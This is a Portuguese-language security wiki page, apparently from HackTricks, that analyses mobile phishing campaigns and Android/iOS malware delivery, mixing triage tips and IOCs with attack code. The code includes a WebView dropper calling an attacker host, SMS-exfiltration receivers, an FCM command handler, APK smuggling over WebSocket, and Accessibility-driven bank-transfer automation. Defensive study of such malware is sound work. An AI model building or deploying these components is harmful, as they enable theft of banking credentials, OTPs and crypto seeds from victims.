# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Esta página cobre técnicas usadas por threat actors para distribuir **malicious Android APKs** e **iOS mobile-configuration profiles** por meio de phishing (SEO, social engineering, fake stores, dating apps, etc.).
> O material foi adaptado da campanha SarangTrap exposta pela Zimperium zLabs (2025) e de outras pesquisas públicas.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Registrar dezenas de domínios look-alike (dating, cloud share, car service…).
– Usar palavras-chave no idioma local e emojis no elemento `<title>` para ranquear no Google.
– Hospedar *both* Android (`.apk`) e iOS install instructions na mesma landing page.
2. **First Stage Download**
* Android: link direto para um APK *unsigned* ou de “third-party store”.
* iOS: `itms-services://` ou link HTTPS simples para um malicious **mobileconfig** profile (veja abaixo).
3. **Post-install Social Engineering**
* No primeiro uso, o app pede um **invitation / verification code** (ilusão de acesso exclusivo).
* O código é **POSTed over HTTP** para o Command-and-Control (C2).
* C2 responde `{"success":true}` ➜ malware continua.
* Sandbox / AV dynamic analysis que nunca envia um código válido não vê **no malicious behaviour** (evasion).
4. **Runtime Permission Abuse** (Android)
* Dangerous permissions só são solicitadas **after positive C2 response**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Variantes recentes **removem `<uses-permission>` para SMS do `AndroidManifest.xml`** mas deixam o caminho de código Java/Kotlin que lê SMS via reflection ⇒ reduz o static score enquanto ainda funciona em devices que concedem a permission via abuso de `AppOps` ou targets antigos.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 introduziu **Restricted settings** para apps sideloaded: os toggles de Accessibility e Notification Listener ficam desativados até o usuário permitir explicitamente restricted settings em **App info**.
* Phishing pages e droppers agora incluem instruções passo a passo de UI para **allow restricted settings** para o app sideloaded e então habilitar o acesso de Accessibility/Notification.
* Um bypass mais novo é instalar o payload via um fluxo **session-based PackageInstaller** (o mesmo método que app stores usam). Android trata o app como instalado pela store, então Restricted settings não bloqueia mais Accessibility.
* Dica de triagem: em um dropper, procure com grep por `PackageInstaller.createSession/openSession` junto com código que imediatamente leva a vítima para `ACTION_ACCESSIBILITY_SETTINGS` ou `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Facade UI & Background Collection**
* O app mostra views inofensivas (SMS viewer, gallery picker) implementadas localmente.
* Enquanto isso, ele exfiltra:
- IMEI / IMSI, phone number
- Full `ContactsContract` dump (JSON array)
- JPEG/PNG de `/sdcard/DCIM` comprimidos com [Luban](https://github.com/Curzibn/Luban) para reduzir o tamanho
- Optional SMS content (`content://sms`)
Os payloads são **batch-zipped** e enviados via `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* Um único **mobile-configuration profile** pode solicitar `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. para inscrever o device em uma supervisão tipo “MDM”.
* Instruções de social engineering:
1. Open Settings ➜ *Profile downloaded*.
2. Toque em *Install* três vezes (screenshots na phishing page).
3. Confie no unsigned profile ➜ attacker ganha *Contacts* e *Photo* entitlement sem App Store review.
8. **iOS Web Clip Payload (phishing app icon)**
* Payloads `com.apple.webClip.managed` podem **fixar uma phishing URL na Home Screen** com um ícone/label de marca.
* Web Clips podem rodar em **full-screen** (oculta a browser UI) e ser marcados como **non-removable**, forçando a vítima a deletar o profile para remover o ícone.
9. **Network Layer**
* Plain HTTP, frequentemente na porta 80 com HOST header como `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (sem TLS → fácil de identificar).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Durante a avaliação do malware, automatize a fase do invitation code com Frida/Objection para alcançar a branch maliciosa.
* **Manifest vs. Runtime Diff** – Compare `aapt dump permissions` com `PackageManager#getRequestedPermissions()` em runtime; missing dangerous perms é um red flag.
* **Network Canary** – Configure `iptables -p tcp --dport 80 -j NFQUEUE` para detectar rajadas de POST unsolid após a entrada do código.
* **mobileconfig Inspection** – Use `security cms -D -i profile.mobileconfig` no macOS para listar `PayloadContent` e identificar entitlements excessivos.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indicadores (Genérico)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Esse padrão foi observado em campanhas que abusam de temas de benefícios governamentais para roubar credenciais UPI indianas e OTPs. Os operadores encadeiam plataformas confiáveis para entrega e resiliência.

### Cadeia de entrega em plataformas confiáveis
- Isca de vídeo no YouTube → a descrição contém um short link
- Shortlink → site de phishing no GitHub Pages imitando o portal legítimo
- O mesmo repositório GitHub hospeda um APK com um falso selo “Google Play” linkando diretamente para o arquivo
- Páginas de phishing dinâmicas ficam no Replit; o canal remoto de comando usa Firebase Cloud Messaging (FCM)

### Dropper com payload embutido e instalação offline
- O primeiro APK é um instalador (dropper) que traz o malware real em `assets/app.apk` e pede ao usuário para desativar Wi‑Fi/dados móveis para reduzir a detecção em cloud.
- O payload embutido é instalado sob um nome inocente (por exemplo, “Secure Update”). Após a instalação, tanto o instalador quanto o payload ficam presentes como apps separados.

Dica de triagem estática (grep para payloads embutidos):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Descoberta dinâmica de endpoint via shortlink
- Malware busca uma lista em texto simples, separada por vírgulas, de endpoints ativos a partir de um shortlink; transformações simples de string produzem o path final da página de phishing.

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Harvesting de credenciais UPI baseado em WebView
- A etapa “Make payment of ₹1 / UPI‑Lite” carrega um formulário HTML do atacante a partir do endpoint dinâmico dentro de um WebView e captura campos sensíveis (phone, bank, UPI PIN), que são enviados por `POST` para `addup.php`.

Loader mínimo:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Autopropagação e interceptação de SMS/OTP
- Permissões agressivas são solicitadas na primeira execução:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Contatos são usados em loop para enviar smishing SMS em massa a partir do dispositivo da vítima.
- SMS recebidos são interceptados por um broadcast receiver e enviados com metadados (remetente, corpo, SIM slot, ID aleatório por dispositivo) para `/addsm.php`.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) como C2 resiliente
- O payload se registra no FCM; as mensagens push carregam um campo `_type` usado como um switch para acionar ações (por exemplo, atualizar templates de texto de phishing, alternar comportamentos).

Exemplo de payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler sketch:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK contém payload secundário em `assets/app.apk`
- WebView carrega pagamento de `gate.htm` e exfiltra para `/addup.php`
- Exfiltração de SMS para `/addsm.php`
- Busca de configuração orientada por shortlink (por exemplo, `rebrand.ly/*`) retornando endpoints CSV
- Apps rotulados como genéricos “Update/Secure Update”
- Mensagens FCM `data` com um discriminador `_type` em apps não confiáveis

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Atacantes cada vez mais substituem links estáticos de APK por um canal Socket.IO/WebSocket embutido em iscas que parecem Google Play. Isso oculta a URL do payload, contorna filtros de URL/extensão e preserva uma UX de instalação realista.

Fluxo típico de cliente observado no mundo real:

<details>
<summary>Downloader fake Play via Socket.IO (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Por que isso contorna controles simples:
- Nenhum URL estático de APK é exposto; o payload é reconstruído em memória a partir de frames WebSocket.
- Filtros de URL/MIME/extensão que bloqueiam respostas diretas .apk podem não detectar dados binários encapsulados via WebSockets/Socket.IO.
- Crawlers e sandboxes de URL que não executam WebSockets não recuperarão o payload.

Veja também WebSocket tradecraft e tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

A campanha banker/RAT RatOn (ThreatFabric) é um exemplo concreto de como operações modernas de phishing mobile combinam WebView droppers, automação de UI guiada por Accessibility, overlays/ransom, coerção de Device Admin, Automated Transfer System (ATS), takeover de carteira cripto e até orquestração de NFC-relay. Esta seção abstrai as técnicas reutilizáveis.

### Stage-1: WebView → native install bridge (dropper)
Atacantes apresentam um WebView apontando para uma página do atacante e injetam uma interface JavaScript que expõe um instalador nativo. Um toque em um botão HTML chama o código nativo que instala um APK de second-stage empacotado nos assets do dropper e então o inicia diretamente.

Padrão mínimo:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML na página:
```html
<button onclick="bridge.installApk()">Install</button>
```
Após a instalação, o dropper inicia o payload via package/activity explícito:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Ideia de caça: apps não confiáveis chamando `addJavascriptInterface()` e expondo métodos tipo instalador para WebView; APK distribuindo um payload secundário embutido em `assets/` e invocando a Package Installer Session API.

### Funil de consentimento: Accessibility + Device Admin + prompts de runtime subsequentes
A Stage-2 abre um WebView que hospeda uma página “Access”. O botão dela chama um método exportado que navega a vítima até as configurações de Accessibility e solicita ativar o serviço malicioso. Depois de concedido, o malware usa Accessibility para clicar automaticamente nos diálogos de permissão de runtime seguintes (contacts, overlay, manage system settings, etc.) e solicita Device Admin.

- Accessibility ajuda programaticamente a aceitar prompts posteriores ao localizar botões como “Allow”/“OK” na árvore de nós e disparar cliques.
- Verificação/solicitação de permissão de overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Veja também:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operators can issue commands to:
- render a full-screen overlay from a URL, or
- pass inline HTML that is loaded into a WebView overlay.

Likely uses: coerção (entrada de PIN), abertura de wallet para capturar PINs, mensagens de resgate. Mantenha um comando para garantir que a permissão de overlay seja concedida se estiver faltando.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: periodicamente faça dump da árvore de nós do Accessibility, serialize textos/roles/bounds visíveis e envie ao C2 como uma pseudo-screen (comandos como `txt_screen` uma vez e `screen_live` contínuo).
- High-fidelity: solicite MediaProjection e inicie screen-casting/recording sob demanda (comandos como `display` / `record`).

### ATS playbook (bank app automation)
Dado uma tarefa em JSON, abra o aplicativo do banco, controle a UI via Accessibility com uma mistura de consultas de texto e toques por coordenadas, e insira o PIN de pagamento da vítima quando solicitado.

Exemplo de tarefa:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Exemplos de textos vistos em um fluxo-alvo (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Operadores também podem verificar/elevar limites de transferência via comandos como `check_limit` e `limit` que navegam na UI de limites de forma semelhante.

### Crypto wallet seed extraction
Targets como MetaMask, Trust Wallet, Blockchain.com, Phantom. Fluxo: unlock (PIN roubado ou senha fornecida), navegar até Security/Recovery, revelar/mostrar seed phrase, keylog/exfiltrate it. Implemente seletores com awareness de locale (EN/RU/CZ/SK) para estabilizar a navegação entre idiomas.

### Device Admin coercion
As APIs de Device Admin são usadas para aumentar as oportunidades de captura de PIN e frustrar a vítima:

- Immediate lock:
```java
dpm.lockNow();
```
- Expire a credencial atual para forçar a alteração (Accessibility captura o novo PIN/senha):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forçar desbloqueio não biométrico desativando os recursos biométricos do keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Muitos controles de `DevicePolicyManager` exigem `Device Owner`/`Profile Owner` em Android recentes; alguns builds de OEM podem ser mais permissivos. Sempre valide no OS/OEM de destino.

### NFC relay orchestration (NFSkate)
Stage-3 pode instalar e iniciar um módulo externo de NFC-relay (por exemplo, NFSkate) e até fornecer a ele um modelo HTML para orientar a vítima durante o relay. Isso permite cash-out contactless card-present junto com ATS online.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Threat actors increasingly blend Accessibility-driven automation with anti-detection tuned against basic behaviour biometrics. Um banker/RAT recente mostra dois modos complementares de entrega de texto e um toggle do operador para simular digitação humana com cadence randomizada.

- Discovery mode: enumere nós visíveis com seletores e bounds para mirar com precisão inputs (ID, text, contentDescription, hint, bounds) antes de agir.
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT` diretamente no nó alvo (estável, sem keyboard);
- Mode 2 – clipboard set + `ACTION_PASTE` no nó em foco (funciona quando `setText` direto é bloqueado).
- Human-like cadence: divida a string fornecida pelo operador e entregue-a caractere por caractere com delays randomizados de 300–3000 ms entre eventos para evitar heurísticas de “machine-speed typing”. Implementado seja crescendo progressivamente o valor via `ACTION_SET_TEXT`, seja colando um caractere por vez.

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Overlays bloqueadores para fraude cobrem:
- Renderize um `TYPE_ACCESSIBILITY_OVERLAY` em tela cheia com opacidade controlada pelo operador; mantenha-o opaco para a vítima enquanto a automação remota prossegue por baixo.
- Comandos normalmente expostos: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Overlay minimal com alpha ajustável:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator control primitives often seen: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## Multi-stage Android dropper with WebView bridge, JNI string decoder, and staged DEX loading

A análise de 03 de abril de 2026 da CERT Polska sobre **cifrat** é uma boa referência para um loader Android moderno entregue por phishing, no qual o APK visível é apenas um shell instalador. O tradecraft reutilizável não é o nome da família, mas a forma como as etapas são encadeadas:

1. A página de phishing entrega um APK lure.
2. A Stage 0 solicita `REQUEST_INSTALL_PACKAGES`, carrega um `.so` nativo, descriptografa um blob embutido e instala a stage 2 com **PackageInstaller sessions**.
3. A Stage 2 descriptografa outro asset oculto, trata-o como um ZIP e **carrega DEX dinamicamente** para o RAT final.
4. A stage final abusa de Accessibility/MediaProjection e usa WebSockets para controle/dados.

### WebView JavaScript bridge as the installer controller

Em vez de usar o WebView apenas para branding falso, o lure pode expor uma bridge que permite a uma página local/remota fazer fingerprint do dispositivo e acionar a lógica nativa de instalação:
```java
webView.addJavascriptInterface(controller, "Android");
webView.loadUrl("file:///android_asset/bootstrap.html");

@JavascriptInterface
public String get_SYSINFO() { /* SDK, model, manufacturer, locale */ }

@JavascriptInterface
public void start() { mainHandler.post(this::installStage2); }
```
Triage ideas:
- grep for `addJavascriptInterface`, `@JavascriptInterface`, `loadUrl("file:///android_asset/` e remote phishing URLs used in the same activity
- watch for bridges exposing installer-like methods (`start`, `install`, `openAccessibility`, `requestOverlay`)
- if the bridge is backed by a phishing page, treat it as an operator/controller surface, not just UI

### Native string decoding registered in `JNI_OnLoad`

One useful pattern is a Java method that looks harmless but is actually backed by `RegisterNatives` during `JNI_OnLoad`. In cifrat, the decoder ignored the first char, used the second as a 1-byte XOR key, hex-decoded the remainder, and transformed each byte as `((b - i) & 0xff) ^ key`.

Minimal offline reproduction:
```python
def decode_native(s: str) -> str:
key = ord(s[1]); raw = bytes.fromhex(s[2:])
return bytes((((b - i) & 0xFF) ^ key) for i, b in enumerate(raw)).decode()
```
Use isto quando você vir:
- chamadas repetidas para um método Java nativo para URLs, nomes de pacote ou keys
- `JNI_OnLoad` resolvendo classes e chamando `RegisterNatives`
- nenhum plaintext string significativo em DEX, mas muitas constantes curtas com aparência hexadecimal passadas para um helper

### Layered payload staging: XOR resource -> installed APK -> RC4-like asset -> ZIP -> DEX

Esta família usou duas camadas de unpacking que valem a pena caçar de forma genérica:

- **Stage 0**: decrypt `res/raw/*.bin` com uma XOR key derivada através do decoder nativo, depois install o plaintext APK por meio de `PackageInstaller.createSession` -> `openWrite` -> `fsync` -> `commit`
- **Stage 2**: extraia um asset aparentemente inocente como `FH.svg`, decrypt ele com uma rotina semelhante a RC4, faça parse do resultado como um ZIP, depois carregue DEX files ocultos

Isso é um forte indicador de um pipeline real de dropper/loader porque cada layer mantém o próximo stage opaco para basic static scanning.

Quick triage checklist:
- `REQUEST_INSTALL_PACKAGES` junto com chamadas de session do `PackageInstaller`
- receivers para `PACKAGE_ADDED` / `PACKAGE_REPLACED` para continuar a chain após a install
- blobs encrypted em `res/raw/` ou `assets/` com extensions não-media
- `DexClassLoader` / `InMemoryDexClassLoader` / ZIP handling perto de custom decryptors

### Native anti-debugging through `/proc/self/maps`

O bootstrap nativo também varria `/proc/self/maps` em busca de `libjdwp.so` e abortava se estivesse presente. Isso é uma early anti-analysis check prática porque o debugging baseado em JDWP deixa uma library mapeada reconhecível:
```c
FILE *f = fopen("/proc/self/maps", "r");
while (fgets(line, sizeof(line), f)) {
if (strstr(line, "libjdwp.so")) return -1;
}
```
Ideias de hunting:
- grep native code / decompiler output para `/proc/self/maps`, `libjdwp.so`, `frida`, `qemu`, `goldfish`, `ranchu`
- se os hooks do Frida chegarem tarde demais, inspecione `.init_array` e `JNI_OnLoad` primeiro
- trate anti-debug + string decoder + staged install como um único cluster, não como findings independentes

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Analysis of cifrat: could this be an evolution of a mobile RAT?](https://cert.pl/en/posts/2026/04/cifrat-analysis/)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
